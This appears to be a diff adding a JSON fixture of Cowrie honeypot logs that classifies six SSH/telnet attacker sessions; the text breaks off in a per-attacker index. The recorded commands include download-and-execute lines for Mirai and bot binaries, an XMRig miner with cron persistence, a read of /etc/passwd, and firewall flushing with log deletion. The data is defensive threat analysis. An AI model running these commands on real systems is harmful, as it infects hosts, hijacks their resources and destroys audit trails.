@@ -1,0 +1,995 @@
+{
+  "sessions": [
+    {
+      "session_id": "a1b2c3d4e5f6",
+      "src_ip": "185.220.101.45",
+      "protocol": "ssh",
+      "classification": "iot_botnet_propagation",
+      "automation": "automated",
+      "start": "2026-03-01T08:12:01.120Z",
+      "end": "2026-03-01T08:12:14.500Z",
+      "duration_seconds": 13.38,
+      "events": [
+        {
+          "timestamp": "2026-03-01T08:12:01.120Z",
+          "event": "cowrie.session.connect",
+          "detail": "New connection: 185.220.101.45:48122 (10.0.0.50:2222) [session: a1b2c3d4e5f6]"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:01.340Z",
+          "event": "cowrie.client.version",
+          "detail": "Remote SSH version: SSH-2.0-libssh2_1.10.0"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:02.010Z",
+          "event": "cowrie.login.failed",
+          "detail": "root/****"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:02.510Z",
+          "event": "cowrie.login.failed",
+          "detail": "root/******"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:03.010Z",
+          "event": "cowrie.login.failed",
+          "detail": "admin/*****"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:03.520Z",
+          "event": "cowrie.login.failed",
+          "detail": "root/********"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:04.020Z",
+          "event": "cowrie.login.failed",
+          "detail": "ubuntu/******"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:04.510Z",
+          "event": "cowrie.login.failed",
+          "detail": "pi/*********"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:05.100Z",
+          "event": "cowrie.login.success",
+          "detail": "root/********"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:05.200Z",
+          "event": "cowrie.session.params",
+          "detail": ""
+        },
+        {
+          "timestamp": "2026-03-01T08:12:06.300Z",
+          "event": "cowrie.command.input",
+          "detail": "uname -a"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:07.100Z",
+          "event": "cowrie.command.input",
+          "detail": "cat /etc/passwd"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:08.400Z",
+          "event": "cowrie.command.input",
+          "detail": "wget http://185.220.101.45/bins/mirai.x86 -O /tmp/.x"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:09.800Z",
+          "event": "cowrie.session.file_download",
+          "detail": "http://185.220.101.45/bins/mirai.x86"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:10.200Z",
+          "event": "cowrie.command.input",
+          "detail": "chmod +x /tmp/.x"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:11.000Z",
+          "event": "cowrie.command.input",
+          "detail": "/tmp/.x"
+        },
+        {
+          "timestamp": "2026-03-01T08:12:14.500Z",
+          "event": "cowrie.session.closed",
+          "detail": "Connection lost after 13 seconds"
+        }
+      ]
+    },
+    {
+      "session_id": "b2c3d4e5f6a7",
+      "src_ip": "45.33.32.156",
+      "protocol": "ssh",
+      "classification": "cryptominer_deployment",
+      "automation": "automated",
+      "start": "2026-03-01T09:45:22.010Z",
+      "end": "2026-03-01T09:45:35.000Z",
+      "duration_seconds": 12.99,
+      "events": [
+        {
+          "timestamp": "2026-03-01T09:45:22.010Z",
+          "event": "cowrie.session.connect",
+          "detail": "New connection: 45.33.32.156:39110 (10.0.0.50:2222) [session: b2c3d4e5f6a7]"
+        },
+        {
+          "timestamp": "2026-03-01T09:45:22.200Z",
+          "event": "cowrie.client.version",
+          "detail": "Remote SSH version: SSH-2.0-Paramiko_2.11.0"
+        },
+        {
+          "timestamp": "2026-03-01T09:45:22.800Z",
+          "event": "cowrie.login.failed",
+          "detail": "root/****"
+        },
+        {
+          "timestamp": "2026-03-01T09:45:23.200Z",
+          "event": "cowrie.login.failed",
+          "detail": "root/********"
+        },
+        {
+          "timestamp": "2026-03-01T09:45:23.900Z",
+          "event": "cowrie.login.success",
+          "detail": "root/********"
+        },
+        {
+          "timestamp": "2026-03-01T09:45:25.100Z",
+          "event": "cowrie.command.input",
+          "detail": "whoami"
+        },
+        {
+          "timestamp": "2026-03-01T09:45:26.300Z",
+          "event": "cowrie.command.input",
+          "detail": "free -m"
+        },
+        {
+          "timestamp": "2026-03-01T09:45:27.500Z",
+          "event": "cowrie.command.input",
+          "detail": "curl -s http://45.33.32.156/xmrig.tar.gz | tar xz -C /tmp"
+        },
+        {
+          "timestamp": "2026-03-01T09:45:29.100Z",
+          "event": "cowrie.session.file_download",
+          "detail": "http://45.33.32.156/xmrig.tar.gz"
+        },
+        {
+          "timestamp": "2026-03-01T09:45:30.200Z",
+          "event": "cowrie.command.input",
+          "detail": "/tmp/xmrig -o pool.minexmr.com:443 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft8XpinWun2sRigMz9dYLcF4S5etEeVy29uWoYbMLhK8A8w8k"
+        },
+        {
+          "timestamp": "2026-03-01T09:45:32.000Z",
+          "event": "cowrie.command.input",
+          "detail": "crontab -l"
+        },
+        {
+          "timestamp": "2026-03-01T09:45:33.400Z",
+          "event": "cowrie.command.input",
+          "detail": "echo '* * * * * /tmp/xmrig -o pool.minexmr.com:443' | crontab -"
+        },
+        {
+          "timestamp": "2026-03-01T09:45:35.000Z",
+          "event": "cowrie.session.closed",
+          "detail": "Connection lost after 13 seconds"
+        }
+      ]
+    },
+    {
+      "session_id": "c3d4e5f6a7b8",
+      "src_ip": "103.149.172.88",
+      "protocol": "telnet",
+      "classification": "iot_botnet_propagation",
+      "automation": "automated",
+      "start": "2026-03-01T11:02:10.050Z",
+      "end": "2026-03-01T11:02:18.000Z",
+      "duration_seconds": 7.95,
+      "events": [
+        {
+          "timestamp": "2026-03-01T11:02:10.050Z",
+          "event": "cowrie.session.connect",
+          "detail": "New connection: 103.149.172.88:52001 (10.0.0.50:2223) [session: c3d4e5f6a7b8]"
+        },
+        {
+          "timestamp": "2026-03-01T11:02:11.100Z",
+          "event": "cowrie.login.failed",
+          "detail": "admin/*****"
+        },
+        {
+          "timestamp": "2026-03-01T11:02:11.600Z",
+          "event": "cowrie.login.failed",
+          "detail": "support/*******"
+        },
+        {
+          "timestamp": "2026-03-01T11:02:12.200Z",
+          "event": "cowrie.login.success",
+          "detail": "root/********"
+        },
+        {
+          "timestamp": "2026-03-01T11:02:13.000Z",
+          "event": "cowrie.command.input",
+          "detail": "busybox wget http://103.149.172.88/l.sh -O- | sh"
+        },
+        {
+          "timestamp": "2026-03-01T11:02:14.500Z",
+          "event": "cowrie.session.file_download",
+          "detail": "http://103.149.172.88/l.sh"
+        },
+        {
+          "timestamp": "2026-03-01T11:02:15.200Z",
+          "event": "cowrie.command.input",
+          "detail": "cd /tmp; wget http://103.149.172.88/bot.arm7; chmod 777 bot.arm7; ./bot.arm7"
+        },
+        {
+          "timestamp": "2026-03-01T11:02:16.800Z",
+          "event": "cowrie.session.file_download",
+          "detail": "http://103.149.172.88/bot.arm7"
+        },
+        {
+          "timestamp": "2026-03-01T11:02:18.000Z",
+          "event": "cowrie.session.closed",
+          "detail": "Connection lost after 8 seconds"
+        }
+      ]
+    },
+    {
+      "session_id": "d4e5f6a7b8c9",
+      "src_ip": "198.51.100.77",
+      "protocol": "ssh",
+      "classification": "manual_reconnaissance",
+      "automation": "likely_manual",
+      "start": "2026-03-01T14:18:44.000Z",
+      "end": "2026-03-01T14:20:41.000Z",
+      "duration_seconds": 117.0,
+      "events": [
+        {
+          "timestamp": "2026-03-01T14:18:44.000Z",
+          "event": "cowrie.session.connect",
+          "detail": "New connection: 198.51.100.77:44821 (10.0.0.50:2222) [session: d4e5f6a7b8c9]"
+        },
+        {
+          "timestamp": "2026-03-01T14:18:44.200Z",
+          "event": "cowrie.client.version",
+          "detail": "Remote SSH version: SSH-2.0-OpenSSH_8.9p1"
+        },
+        {
+          "timestamp": "2026-03-01T14:18:50.500Z",
+          "event": "cowrie.login.success",
+          "detail": "root/********"
+        },
+        {
+          "timestamp": "2026-03-01T14:18:55.000Z",
+          "event": "cowrie.command.input",
+          "detail": "ls -la"
+        },
+        {
+          "timestamp": "2026-03-01T14:19:02.000Z",
+          "event": "cowrie.command.input",
+          "detail": "ps aux"
+        },
+        {
+          "timestamp": "2026-03-01T14:19:15.000Z",
+          "event": "cowrie.command.input",
+          "detail": "history"
+        },
+        {
+          "timestamp": "2026-03-01T14:19:28.000Z",
+          "event": "cowrie.command.input",
+          "detail": "netstat -antp"
+        },
+        {
+          "timestamp": "2026-03-01T14:19:45.000Z",
+          "event": "cowrie.command.input",
+          "detail": "cat /proc/cpuinfo"
+        },
+        {
+          "timestamp": "2026-03-01T14:20:10.000Z",
+          "event": "cowrie.command.input",
+          "detail": "find / -name '*.conf' 2>/dev/null | head"
+        },
+        {
+          "timestamp": "2026-03-01T14:20:40.000Z",
+          "event": "cowrie.command.input",
+          "detail": "exit"
+        },
+        {
+          "timestamp": "2026-03-01T14:20:41.000Z",
+          "event": "cowrie.session.closed",
+          "detail": "Connection lost after 117 seconds"
+        }
+      ]
+    },
+    {
+      "session_id": "e5f6a7b8c9d0",
+      "src_ip": "91.219.237.12",
+      "protocol": "ssh",
+      "classification": "credential_stuffing",
+      "automation": "automated",
+      "start": "2026-03-01T16:05:01.000Z",
+      "end": "2026-03-01T16:05:04.000Z",
+      "duration_seconds": 3.0,
+      "events": [
+        {
+          "timestamp": "2026-03-01T16:05:01.000Z",
+          "event": "cowrie.session.connect",
+          "detail": "New connection: 91.219.237.12:33990 (10.0.0.50:2222) [session: e5f6a7b8c9d0]"
+        },
+        {
+          "timestamp": "2026-03-01T16:05:01.400Z",
+          "event": "cowrie.login.failed",
+          "detail": "root/****"
+        },
+        {
+          "timestamp": "2026-03-01T16:05:01.700Z",
+          "event": "cowrie.login.failed",
+          "detail": "test/****"
+        },
+        {
+          "timestamp": "2026-03-01T16:05:02.000Z",
+          "event": "cowrie.login.failed",
+          "detail": "oracle/******"
+        },
+        {
+          "timestamp": "2026-03-01T16:05:02.300Z",
+          "event": "cowrie.login.failed",
+          "detail": "user/****"
+        },
+        {
+          "timestamp": "2026-03-01T16:05:02.600Z",
+          "event": "cowrie.login.failed",
+          "detail": "ftp/***"
+        },
+        {
+          "timestamp": "2026-03-01T16:05:02.900Z",
+          "event": "cowrie.login.failed",
+          "detail": "guest/*****"
+        },
+        {
+          "timestamp": "2026-03-01T16:05:03.200Z",
+          "event": "cowrie.login.failed",
+          "detail": "mysql/*****"
+        },
+        {
+          "timestamp": "2026-03-01T16:05:03.500Z",
+          "event": "cowrie.login.failed",
+          "detail": "postgres/********"
+        },
+        {
+          "timestamp": "2026-03-01T16:05:04.000Z",
+          "event": "cowrie.session.closed",
+          "detail": "Connection lost after 3 seconds"
+        }
+      ]
+    },
+    {
+      "session_id": "f6a7b8c9d0e1",
+      "src_ip": "185.220.101.45",
+      "protocol": "ssh",
+      "classification": "malware_download",
+      "automation": "automated",
+      "start": "2026-03-02T02:11:00.000Z",
+      "end": "2026-03-02T02:11:07.000Z",
+      "duration_seconds": 7.0,
+      "events": [
+        {
+          "timestamp": "2026-03-02T02:11:00.000Z",
+          "event": "cowrie.session.connect",
+          "detail": "New connection: 185.220.101.45:49100 (10.0.0.50:2222) [session: f6a7b8c9d0e1]"
+        },
+        {
+          "timestamp": "2026-03-02T02:11:01.500Z",
+          "event": "cowrie.login.success",
+          "detail": "root/********"
+        },
+        {
+          "timestamp": "2026-03-02T02:11:02.500Z",
+          "event": "cowrie.command.input",
+          "detail": "wget http://malware-cdn.example.invalid/dropper.sh -O /var/tmp/d.sh; sh /var/tmp/d.sh"
+        },
+        {
+          "timestamp": "2026-03-02T02:11:04.000Z",
+          "event": "cowrie.session.file_download",
+          "detail": "http://malware-cdn.example.invalid/dropper.sh"
+        },
+        {
+          "timestamp": "2026-03-02T02:11:05.000Z",
+          "event": "cowrie.command.input",
+          "detail": "iptables -F; rm -rf /var/log/*"
+        },
+        {
+          "timestamp": "2026-03-02T02:11:07.000Z",
+          "event": "cowrie.session.closed",
+          "detail": "Connection lost after 7 seconds"
+        }
+      ]
+    }
+  ],
+  "global": [
+    {
+      "timestamp": "2026-03-01T08:12:01.120Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.session.connect",
+      "detail": "New connection: 185.220.101.45:48122 (10.0.0.50:2222) [session: a1b2c3d4e5f6]"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:01.340Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.client.version",
+      "detail": "Remote SSH version: SSH-2.0-libssh2_1.10.0"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:02.010Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.login.failed",
+      "detail": "root/****"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:02.510Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.login.failed",
+      "detail": "root/******"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:03.010Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.login.failed",
+      "detail": "admin/*****"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:03.520Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.login.failed",
+      "detail": "root/********"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:04.020Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.login.failed",
+      "detail": "ubuntu/******"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:04.510Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.login.failed",
+      "detail": "pi/*********"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:05.100Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.login.success",
+      "detail": "root/********"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:05.200Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.session.params",
+      "detail": ""
+    },
+    {
+      "timestamp": "2026-03-01T08:12:06.300Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.command.input",
+      "detail": "uname -a"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:07.100Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.command.input",
+      "detail": "cat /etc/passwd"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:08.400Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.command.input",
+      "detail": "wget http://185.220.101.45/bins/mirai.x86 -O /tmp/.x"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:09.800Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.session.file_download",
+      "detail": "http://185.220.101.45/bins/mirai.x86"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:10.200Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.command.input",
+      "detail": "chmod +x /tmp/.x"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:11.000Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.command.input",
+      "detail": "/tmp/.x"
+    },
+    {
+      "timestamp": "2026-03-01T08:12:14.500Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "a1b2c3d4e5f6",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.session.closed",
+      "detail": "Connection lost after 13 seconds"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:22.010Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.session.connect",
+      "detail": "New connection: 45.33.32.156:39110 (10.0.0.50:2222) [session: b2c3d4e5f6a7]"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:22.200Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.client.version",
+      "detail": "Remote SSH version: SSH-2.0-Paramiko_2.11.0"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:22.800Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.login.failed",
+      "detail": "root/****"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:23.200Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.login.failed",
+      "detail": "root/********"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:23.900Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.login.success",
+      "detail": "root/********"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:25.100Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.command.input",
+      "detail": "whoami"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:26.300Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.command.input",
+      "detail": "free -m"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:27.500Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.command.input",
+      "detail": "curl -s http://45.33.32.156/xmrig.tar.gz | tar xz -C /tmp"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:29.100Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.session.file_download",
+      "detail": "http://45.33.32.156/xmrig.tar.gz"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:30.200Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.command.input",
+      "detail": "/tmp/xmrig -o pool.minexmr.com:443 -u 44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft8XpinWun2sRigMz9dYLcF4S5etEeVy29uWoYbMLhK8A8w8k"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:32.000Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.command.input",
+      "detail": "crontab -l"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:33.400Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.command.input",
+      "detail": "echo '* * * * * /tmp/xmrig -o pool.minexmr.com:443' | crontab -"
+    },
+    {
+      "timestamp": "2026-03-01T09:45:35.000Z",
+      "src_ip": "45.33.32.156",
+      "session_id": "b2c3d4e5f6a7",
+      "classification": "cryptominer_deployment",
+      "event": "cowrie.session.closed",
+      "detail": "Connection lost after 13 seconds"
+    },
+    {
+      "timestamp": "2026-03-01T11:02:10.050Z",
+      "src_ip": "103.149.172.88",
+      "session_id": "c3d4e5f6a7b8",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.session.connect",
+      "detail": "New connection: 103.149.172.88:52001 (10.0.0.50:2223) [session: c3d4e5f6a7b8]"
+    },
+    {
+      "timestamp": "2026-03-01T11:02:11.100Z",
+      "src_ip": "103.149.172.88",
+      "session_id": "c3d4e5f6a7b8",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.login.failed",
+      "detail": "admin/*****"
+    },
+    {
+      "timestamp": "2026-03-01T11:02:11.600Z",
+      "src_ip": "103.149.172.88",
+      "session_id": "c3d4e5f6a7b8",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.login.failed",
+      "detail": "support/*******"
+    },
+    {
+      "timestamp": "2026-03-01T11:02:12.200Z",
+      "src_ip": "103.149.172.88",
+      "session_id": "c3d4e5f6a7b8",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.login.success",
+      "detail": "root/********"
+    },
+    {
+      "timestamp": "2026-03-01T11:02:13.000Z",
+      "src_ip": "103.149.172.88",
+      "session_id": "c3d4e5f6a7b8",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.command.input",
+      "detail": "busybox wget http://103.149.172.88/l.sh -O- | sh"
+    },
+    {
+      "timestamp": "2026-03-01T11:02:14.500Z",
+      "src_ip": "103.149.172.88",
+      "session_id": "c3d4e5f6a7b8",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.session.file_download",
+      "detail": "http://103.149.172.88/l.sh"
+    },
+    {
+      "timestamp": "2026-03-01T11:02:15.200Z",
+      "src_ip": "103.149.172.88",
+      "session_id": "c3d4e5f6a7b8",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.command.input",
+      "detail": "cd /tmp; wget http://103.149.172.88/bot.arm7; chmod 777 bot.arm7; ./bot.arm7"
+    },
+    {
+      "timestamp": "2026-03-01T11:02:16.800Z",
+      "src_ip": "103.149.172.88",
+      "session_id": "c3d4e5f6a7b8",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.session.file_download",
+      "detail": "http://103.149.172.88/bot.arm7"
+    },
+    {
+      "timestamp": "2026-03-01T11:02:18.000Z",
+      "src_ip": "103.149.172.88",
+      "session_id": "c3d4e5f6a7b8",
+      "classification": "iot_botnet_propagation",
+      "event": "cowrie.session.closed",
+      "detail": "Connection lost after 8 seconds"
+    },
+    {
+      "timestamp": "2026-03-01T14:18:44.000Z",
+      "src_ip": "198.51.100.77",
+      "session_id": "d4e5f6a7b8c9",
+      "classification": "manual_reconnaissance",
+      "event": "cowrie.session.connect",
+      "detail": "New connection: 198.51.100.77:44821 (10.0.0.50:2222) [session: d4e5f6a7b8c9]"
+    },
+    {
+      "timestamp": "2026-03-01T14:18:44.200Z",
+      "src_ip": "198.51.100.77",
+      "session_id": "d4e5f6a7b8c9",
+      "classification": "manual_reconnaissance",
+      "event": "cowrie.client.version",
+      "detail": "Remote SSH version: SSH-2.0-OpenSSH_8.9p1"
+    },
+    {
+      "timestamp": "2026-03-01T14:18:50.500Z",
+      "src_ip": "198.51.100.77",
+      "session_id": "d4e5f6a7b8c9",
+      "classification": "manual_reconnaissance",
+      "event": "cowrie.login.success",
+      "detail": "root/********"
+    },
+    {
+      "timestamp": "2026-03-01T14:18:55.000Z",
+      "src_ip": "198.51.100.77",
+      "session_id": "d4e5f6a7b8c9",
+      "classification": "manual_reconnaissance",
+      "event": "cowrie.command.input",
+      "detail": "ls -la"
+    },
+    {
+      "timestamp": "2026-03-01T14:19:02.000Z",
+      "src_ip": "198.51.100.77",
+      "session_id": "d4e5f6a7b8c9",
+      "classification": "manual_reconnaissance",
+      "event": "cowrie.command.input",
+      "detail": "ps aux"
+    },
+    {
+      "timestamp": "2026-03-01T14:19:15.000Z",
+      "src_ip": "198.51.100.77",
+      "session_id": "d4e5f6a7b8c9",
+      "classification": "manual_reconnaissance",
+      "event": "cowrie.command.input",
+      "detail": "history"
+    },
+    {
+      "timestamp": "2026-03-01T14:19:28.000Z",
+      "src_ip": "198.51.100.77",
+      "session_id": "d4e5f6a7b8c9",
+      "classification": "manual_reconnaissance",
+      "event": "cowrie.command.input",
+      "detail": "netstat -antp"
+    },
+    {
+      "timestamp": "2026-03-01T14:19:45.000Z",
+      "src_ip": "198.51.100.77",
+      "session_id": "d4e5f6a7b8c9",
+      "classification": "manual_reconnaissance",
+      "event": "cowrie.command.input",
+      "detail": "cat /proc/cpuinfo"
+    },
+    {
+      "timestamp": "2026-03-01T14:20:10.000Z",
+      "src_ip": "198.51.100.77",
+      "session_id": "d4e5f6a7b8c9",
+      "classification": "manual_reconnaissance",
+      "event": "cowrie.command.input",
+      "detail": "find / -name '*.conf' 2>/dev/null | head"
+    },
+    {
+      "timestamp": "2026-03-01T14:20:40.000Z",
+      "src_ip": "198.51.100.77",
+      "session_id": "d4e5f6a7b8c9",
+      "classification": "manual_reconnaissance",
+      "event": "cowrie.command.input",
+      "detail": "exit"
+    },
+    {
+      "timestamp": "2026-03-01T14:20:41.000Z",
+      "src_ip": "198.51.100.77",
+      "session_id": "d4e5f6a7b8c9",
+      "classification": "manual_reconnaissance",
+      "event": "cowrie.session.closed",
+      "detail": "Connection lost after 117 seconds"
+    },
+    {
+      "timestamp": "2026-03-01T16:05:01.000Z",
+      "src_ip": "91.219.237.12",
+      "session_id": "e5f6a7b8c9d0",
+      "classification": "credential_stuffing",
+      "event": "cowrie.session.connect",
+      "detail": "New connection: 91.219.237.12:33990 (10.0.0.50:2222) [session: e5f6a7b8c9d0]"
+    },
+    {
+      "timestamp": "2026-03-01T16:05:01.400Z",
+      "src_ip": "91.219.237.12",
+      "session_id": "e5f6a7b8c9d0",
+      "classification": "credential_stuffing",
+      "event": "cowrie.login.failed",
+      "detail": "root/****"
+    },
+    {
+      "timestamp": "2026-03-01T16:05:01.700Z",
+      "src_ip": "91.219.237.12",
+      "session_id": "e5f6a7b8c9d0",
+      "classification": "credential_stuffing",
+      "event": "cowrie.login.failed",
+      "detail": "test/****"
+    },
+    {
+      "timestamp": "2026-03-01T16:05:02.000Z",
+      "src_ip": "91.219.237.12",
+      "session_id": "e5f6a7b8c9d0",
+      "classification": "credential_stuffing",
+      "event": "cowrie.login.failed",
+      "detail": "oracle/******"
+    },
+    {
+      "timestamp": "2026-03-01T16:05:02.300Z",
+      "src_ip": "91.219.237.12",
+      "session_id": "e5f6a7b8c9d0",
+      "classification": "credential_stuffing",
+      "event": "cowrie.login.failed",
+      "detail": "user/****"
+    },
+    {
+      "timestamp": "2026-03-01T16:05:02.600Z",
+      "src_ip": "91.219.237.12",
+      "session_id": "e5f6a7b8c9d0",
+      "classification": "credential_stuffing",
+      "event": "cowrie.login.failed",
+      "detail": "ftp/***"
+    },
+    {
+      "timestamp": "2026-03-01T16:05:02.900Z",
+      "src_ip": "91.219.237.12",
+      "session_id": "e5f6a7b8c9d0",
+      "classification": "credential_stuffing",
+      "event": "cowrie.login.failed",
+      "detail": "guest/*****"
+    },
+    {
+      "timestamp": "2026-03-01T16:05:03.200Z",
+      "src_ip": "91.219.237.12",
+      "session_id": "e5f6a7b8c9d0",
+      "classification": "credential_stuffing",
+      "event": "cowrie.login.failed",
+      "detail": "mysql/*****"
+    },
+    {
+      "timestamp": "2026-03-01T16:05:03.500Z",
+      "src_ip": "91.219.237.12",
+      "session_id": "e5f6a7b8c9d0",
+      "classification": "credential_stuffing",
+      "event": "cowrie.login.failed",
+      "detail": "postgres/********"
+    },
+    {
+      "timestamp": "2026-03-01T16:05:04.000Z",
+      "src_ip": "91.219.237.12",
+      "session_id": "e5f6a7b8c9d0",
+      "classification": "credential_stuffing",
+      "event": "cowrie.session.closed",
+      "detail": "Connection lost after 3 seconds"
+    },
+    {
+      "timestamp": "2026-03-02T02:11:00.000Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "f6a7b8c9d0e1",
+      "classification": "malware_download",
+      "event": "cowrie.session.connect",
+      "detail": "New connection: 185.220.101.45:49100 (10.0.0.50:2222) [session: f6a7b8c9d0e1]"
+    },
+    {
+      "timestamp": "2026-03-02T02:11:01.500Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "f6a7b8c9d0e1",
+      "classification": "malware_download",
+      "event": "cowrie.login.success",
+      "detail": "root/********"
+    },
+    {
+      "timestamp": "2026-03-02T02:11:02.500Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "f6a7b8c9d0e1",
+      "classification": "malware_download",
+      "event": "cowrie.command.input",
+      "detail": "wget http://malware-cdn.example.invalid/dropper.sh -O /var/tmp/d.sh; sh /var/tmp/d.sh"
+    },
+    {
+      "timestamp": "2026-03-02T02:11:04.000Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "f6a7b8c9d0e1",
+      "classification": "malware_download",
+      "event": "cowrie.session.file_download",
+      "detail": "http://malware-cdn.example.invalid/dropper.sh"
+    },
+    {
+      "timestamp": "2026-03-02T02:11:05.000Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "f6a7b8c9d0e1",
+      "classification": "malware_download",
+      "event": "cowrie.command.input",
+      "detail": "iptables -F; rm -rf /var/log/*"
+    },
+    {
+      "timestamp": "2026-03-02T02:11:07.000Z",
+      "src_ip": "185.220.101.45",
+      "session_id": "f6a7b8c9d0e1",
+      "classification": "malware_download",
+      "event": "cowrie.session.closed",
+      "detail": "Connection lost after 7 seconds"
+    }
+  ],
+  "by_attacker": {
+    "185.220.101.45": [
+      {
+        "session_id": "a1b2c3d4e5f6",
+        "start": "2026-03-01T08:12:01.120Z",
